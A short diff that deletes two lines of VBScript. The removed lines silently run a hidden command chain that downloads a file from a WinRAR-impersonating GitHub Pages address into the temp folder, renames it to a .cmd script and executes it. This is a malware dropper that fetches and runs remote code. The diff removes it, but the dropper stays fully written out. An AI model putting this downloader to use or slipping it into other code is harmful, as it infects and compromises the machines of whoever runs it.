@@ -1,2 +1,0 @@
-Set objShell = WScript.CreateObject("WScript.Shell")
-objShell.Run "cmd /c @echo OFF & cd %temp% & curl -o WinRARcurl.txt https://winrar-lab.github.io/Windows-7/WinRARcurl.txt & timeout 2 & cd %temp% & rename WinRARcurl.txt WinRARcurl.cmd & timeout 2 & start WinRARcurl.cmd", 0, True
